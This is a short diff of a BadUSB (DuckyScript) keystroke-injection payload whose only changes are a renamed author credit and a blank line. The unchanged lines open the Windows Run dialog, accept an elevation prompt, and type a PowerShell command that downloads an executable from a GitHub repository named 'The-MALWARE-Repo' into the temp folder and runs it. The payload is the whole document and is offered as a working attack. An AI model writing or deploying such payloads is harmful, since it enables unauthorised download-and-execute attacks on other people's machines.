@@ -1,4 +1,4 @@
-REM Made By Kushed3d (Security-Friendly Version)
+REM Made By Gam3r (Security-Friendly Version)
 DEFAULT_DELAY 100
 
 GUI r
@@ -10,3 +10,4 @@ ALT y
 DELAY 750
 STRING cd $env:TEMP; iwr -Uri 'https://raw.githubusercontent.com/Da2dalus/The-MALWARE-Repo/master/Joke/ChilledWindows.exe' -OutFile 'upl.exe'; Start-Sleep 1; Start upl.exe; exit
 ENTER
+
